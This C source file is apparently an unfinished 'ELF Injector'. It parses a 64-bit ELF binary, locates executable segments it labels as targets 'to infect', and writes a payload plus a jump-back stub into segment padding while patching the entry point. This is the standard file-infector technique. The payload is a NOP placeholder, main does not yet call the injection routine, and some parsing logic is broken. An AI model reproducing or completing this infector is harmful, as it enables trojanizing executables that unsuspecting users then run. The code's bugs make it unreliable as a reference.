#include "structs.h"

/* THE FIRST PART:
	https://www.conradk.com/elf-from-scratch/
	https://linuxvox.com/blog/reading-the-contents-of-an-elf-section-programmatically/
	https://www.man7.org/linux/man-pages/man5/elf.5.html
	1. Read header

*/

// Coloured Error Printer


int verbose = 1; 

unsigned char placeholder_payload[] = {0x90, 0x90, 0x90, 0x90,
                                       0x90, 0x90, 0x90, 0x90};
uint32_t placeholder_payload_size = sizeof(placeholder_payload);

void f_error(char *error, char *desc) {
  fprintf(stderr, "\e[1;91m%s:\e[0m\n", error);
  fprintf(stderr, "\e[0;91m\t|%s\e[0m\n", desc);
  exit(1);
}


int read_elf(char *name){
	/* READING ELF DATA:
		fp 	(int) 					: file pointer
		inf	(struct stat)		: memory stats 
		mm	(const char *)	: memmory map with mmap
			-> mmap exports file to string, with stats in inf
	*/
	int fp = open(name, O_RDONLY); 
	struct stat inf;
	if (fp < 0) 
		f_error("OPEN ELF", "Failed to open elf file");
	if (fstat(fp, &inf)) 
		f_error("ELF STAT", "Unable to retreive stats of ELF file");
	const char *mm = mmap(NULL, inf.st_size, PROT_READ, MAP_PRIVATE, fp, 0);
	if(verbose) fprintf(stderr, "ELF file opened successfully \n");

	// END READ 


	// Verifying authenticity & type of ELF file
		// verify authenticity
	if( mm[EI_MAG0] != ELFMAG0 ||
			mm[EI_MAG1] != ELFMAG1 ||
			mm[EI_MAG2] != ELFMAG2 ||
			mm[EI_MAG3] != ELFMAG3   )
		f_error("ELF FILE", "Binary is not an ELF file, failed ELF header validation");
		// verify 64 bit
	if( mm[EI_CLASS] != ELFCLASS64 )
		f_error("ELF FILE", "Binary is not 64 bit, failed ELF header validation");
	else if(verbose) fprintf(stderr, "ELF file verified.\n\n");
	// END VERIFY
		
	/* ELF header
		 header (Elf64_Ehdr)		: Elf header, contains info about binary
		 phsize (unsigned int)	: Elf program header size
		 phnum (unsigned int)		: Elf program header quantity
	*/
	Elf64_Ehdr *header = (Elf64_Ehdr *) mm;

	if( header->e_phoff == 0 )
		f_error("ELF Header", "ELF file Header struct brokeen?");
	else if( header->e_shoff == 0 )
		f_error("ELF Header", "ELF Section Header struct brokeen?");
	else if(verbose){
		fprintf(stderr, "Elf file header byte pos: %lu\n", header->e_phoff);
		//fprintf(stderr, "Elf section header byte pos: %lu\n", header->e_shoff);
	}
	
	unsigned int phsize = header->e_phentsize;
	unsigned int phnum = header->e_phnum;
	if(verbose){
		fprintf(stderr, "Program header entries: %d\n", phnum);
		fprintf(stderr, "Program header entry byte size: %d\n", phsize);
/* idk what I was doing here, this does something I guess
		fprintf(stderr, "Program header entries:\n");
		for(int i = 0; i < phnum; ++i){
			fprintf(stderr, "\t%2d: ", i+1);
			for(int j = 0; j < phsize; ++j)
				fprintf(stderr, "\e[0;32m%x\e[0m", mm[header->e_phoff+(i*phsize)+j]);
			fprintf(stderr, "\n");
		}
		*/
	}

	fprintf(stderr, "Elf program header table offset: %x\n", mm[header->e_phoff]);
	/* Program Header
		 pheader (Elf64_Phdr) : Array of programs
	*/

	Elf64_Phdr *pheader = (Elf64_Phdr *) mm;

	for(int i = 0; i < phnum; ++i){
		if (pheader[i].p_filesz >= 0 && (pheader[i].p_flags & PF_X) ){

			int start = pheader[i].p_filesz + pheader[i].p_offset;
			int end = pheader[i].p_offset + pheader[i].p_memsz;
			fprintf(stderr, "FOUND VALID PROGRAM HEADER TO INFECT, at %x\n", start);

			if(verbose){
				fprintf(stderr, "\n");
				fprintf(stderr, "Elf program header mem size: %lu\n", pheader[i].p_memsz);
				fprintf(stderr, "Elf program file size: %lu\n", pheader[i].p_filesz);
				fprintf(stderr, "Elf program header byte offset: %lu\n", pheader[i].p_offset);
			}

			fprintf(stderr, "END, at %x\n", end);
			fprintf(stderr, "BYTES SIZE: %d\n", end - start);

		}
		
	}
		

	
	
		
	// cleaning up memory
	close(fp);
	munmap((void *) mm, inf.st_size);
	

  close(fp);
  munmap((void *)mm, inf.st_size);

  return 0;
}

void write_injection(char *target_path, struct Elf64_Header header,
                     struct InjectionMetadata meta) {
  int fd = open(target_path, O_RDWR);
  if (fd < 0)
    f_error("Write injection", "Failed to open target binary for writing");

  if (lseek(fd, meta.target_padding_offset, SEEK_SET) < 0)
    f_error("Write injection", "Failed to seek to padding offset");

  unsigned char *payload = placeholder_payload;
  uint32_t payload_len =
      meta.payload_size > 0 ? meta.payload_size : placeholder_payload_size;

  if (write(fd, payload, payload_len) != (ssize_t)payload_len)
    f_error("Write injection", "Failed to write payload");

  if (verbose)
   fprintf(stderr, "[+] Wrote %u bytes of payload at file offset 0x%lx\n", payload_len, meta.target_padding_offset);

  
  unsigned char jmp_stub[12];
  jmp_stub[0] = 0x48;
  jmp_stub[1] = 0xb8;
  memcpy(&jmp_stub[2], &meta.original_entry, 8);
  jmp_stub[10] = 0xff;
  jmp_stub[11] = 0xe0;

  if (write(fd, jmp_stub, sizeof(jmp_stub)) != sizeof(jmp_stub))
    f_error("Write injection", "Failed to write jump-back stub");

  if (verbose)
    fprintf(stderr, "targets original entry 0x%lx\n",
           meta.original_entry);

  uint64_t elf_entry_offset = 0x18;
  if (lseek(fd, elf_entry_offset, SEEK_SET) < 0)
    f_error("Writing injection", "Failed to seek to e_entry");

  uint64_t new_entry = meta.target_vaddr;
  if (write(fd, &new_entry, sizeof(new_entry)) != sizeof(new_entry))
    f_error("Writing injection", "Failed to patch e_entry");

  if (verbose)
    fprintf(stderr, "Patched e_entry: 0x%lx -> 0x%lx\n", header.e_entry, new_entry);


   
}

int main(int argc, char **argv) {
  printf("ELF Injector Initiated, Target binary: \"%s\"\n", argv[1]);
  read_elf(argv[1]);
  return 0;
}
